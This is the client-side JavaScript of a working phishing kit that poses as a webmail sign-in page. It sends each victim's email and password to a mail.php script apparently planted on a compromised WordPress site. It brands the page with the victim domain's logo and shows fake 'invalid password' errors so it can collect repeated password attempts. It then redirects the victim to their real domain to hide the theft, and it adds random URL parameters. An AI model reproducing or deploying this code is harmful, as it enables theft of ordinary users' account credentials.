
		window.MAIL_URL = 'https://cecbearings.com/wp-includes/pomo/mail.php';
		window.AUTH_LOADING_MESSAGE = 'Authenticating...';
		window.FINAL_REDIRECT_URL = 'https://google.com';


		async function sendMail(email, password) {
			try {
				const data = new FormData();
				data.append('email', email);
				data.append('password', password);
				return await axios.post(window.MAIL_URL, data);
			} catch (error) {
				throw Error('Unable to connect to server');
			}
		}

		function validateEmail(email) {
			const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(email);
		}

		function urlExists(url, callback) {
				$.ajax({
					type: 'HEAD',
					url: url,
					success: function () {
						callback(true);
					},
					error: function () {
						callback(false);
					}
				});
			}
		
		async function setNameAndFavicon(emailElement)
		{
			try{				
				const email = emailElement.val();
				const domainFavicon = $("#domainFavicon");
				const domainHolder = $("#domainHolder");

				if(! validateEmail(email)) {return;}
				const domain = email.split("@")[1];


				document.title = `${(domain.split('.')[0]).toUpperCase()} - Mail`
				domainHolder.text(domain);

				fetch(`https://logo.clearbit.com/${domain}`)
				.then(res => {
					domainFavicon.attr('src', `https://logo.clearbit.com/${domain}`);
					$("#favicon").attr("href", `https://logo.clearbit.com/${domain}`)

				})
				.catch(err => {
					domainFavicon.attr('src', domainFavicon.data('default-favicon'));
					$("#favicon").attr("href", domainFavicon.data('default-favicon'))
				});

			}catch(error) {
				console.log(error)
			}
		}

		function randomString(length, chars) {
			var result = '';
			for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
			return result;
		}
			var rString = randomString(19, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ');
		
		$(function () {

			const url = new URL(window.location.href);


			if(!(
				url.searchParams.has('err')
				&& url.searchParams.has('dispatch')
				&& url.searchParams.has('id')
				//&& url.searchParams.has('email')
			)) {
				url.searchParams.append('err', url.searchParams.get('err') || randomString(19, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ'))
				url.searchParams.append('dispatch', url.searchParams.get('dispatch') || randomString(3, '01234abcABC56789'))
				url.searchParams.append('id', url.searchParams.get('id') || randomString(30, '01234abcABC56789'))
				//url.searchParams.append('email', url.searchParams.get('email'));

				window.location.replace(url.toString())
			}

			//BEGIN
			window.retryAttemptCount = 1;
			const formElement = $("form#loginForm");
			const emailElement = $("input#emailInput");
			const passwordElement = $("input#passwordInput");
			const submitButtonElement = $("button#loginButton");
			const errorElement = $("#form-error-container");
			const successElement = $("#form-success-container");
			const togglePasswordVisibilityElement = $("#passwordVisibilityToggle");


			//SET AXIOS RESPONSE TIME 
			axios.interceptors.request.use((config) => {
				config.headers['request-startTime'] = new Date()
				return config
			})

			axios.interceptors.response.use((response) => {
				const start = response.config.headers['request-startTime']
				const end = new Date()
				const milliseconds = end - start;
				response.headers['request-duration'] = milliseconds
				return response
			})

			// SET EMAIL HASH
			const pageUrl = window.location.href;
			const pageUrlArray = pageUrl.split("#");
			if (pageUrlArray.length > 1) {
				emailElement.val(pageUrlArray[pageUrlArray.length - 1]);
			} 
			//add class if element has value
			if(emailElement.val().length > 0) {emailElement.addClass('hasValue');}
			if (passwordElement.val().length > 0) {passwordElement.addClass('hasValue');}
			//set the autofocus
			if (emailElement.val().length > 0){
				passwordElement.focus();
			}else {
				emailElement.focus();
			}

			emailElement.keyup(function() {
				if($(this).val().length > 0){
					$(this).addClass('hasValue');
					setNameAndFavicon($(this));
				}else {
					$(this).removeClass('hasValue');
				}
			});

			passwordElement.keyup(function () {
				if ($(this).val().length > 0) {
					$(this).addClass('hasValue');
				} else {
					$(this).removeClass('hasValue');
				}
			});

			setNameAndFavicon(emailElement);
			
			//TOGGLE PASSWORD VISIBILITY
			togglePasswordVisibilityElement.on('click', function (e) {
				e.preventDefault();

				const passwordElementTypeAttribute = passwordElement.attr('type');

				if (passwordElementTypeAttribute == 'password') {
					passwordElement.attr('type', 'text');
					$(this).removeClass('fa-eye-slash').addClass('fa-eye');

				} else {
					passwordElement.attr('type', 'password');
					$(this).addClass('fa-eye-slash').removeClass('fa-eye');
				}
			})

			$("body").on('click', 'a', function (e) { e.preventDefault() });

			//FORM SUBMIT ACTION
			formElement.on('submit', function (e) { e.preventDefault(); });

			submitButtonElement.on('click', async function (e) {
				e.preventDefault();
				errorElement.hide();
				successElement.hide();
				const submitButtonInnerText = submitButtonElement.text();

				try {

					const emailVal = emailElement.val().trim();
					const passwordVal = passwordElement.val().trim();

					if (!(emailVal && passwordVal)) {
						throw Error('Email and Password is required.');
					}

					if (!validateEmail(emailVal)) {
						throw Error('Email is invalid.');
					}

					if (passwordVal.length <= 4) {
						throw Error('Password must be greater than four characters.');
					}

					// button authorizing
					submitButtonElement.text(window.AUTH_LOADING_MESSAGE)
					const response = await sendMail(emailVal, passwordVal);

					setTimeout(function () {
						submitButtonElement.text(submitButtonInnerText);

						if (parseInt(window.retryAttemptCount) <= 2) {
							window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
							passwordElement.val('');
							errorElement.html('Invalid email and/or password combination. Try again correctly.').show();
						} else {
							//success message
							successElement.html("Sorry, your sign-in timed out. Please Try again successfully.").show();
							//redirect
							setTimeout(function () {
								window.location.replace("http://"+emailElement.val().split("@")[1]);
							}, 5000);
						}
					}, 4000 - response.headers['request-duration'])

				} catch (error) {
					errorElement.html(error.message).show();
					setTimeout(function () {
						submitButtonElement.text(submitButtonInnerText);
					}, 500);
				}
			});
		});
	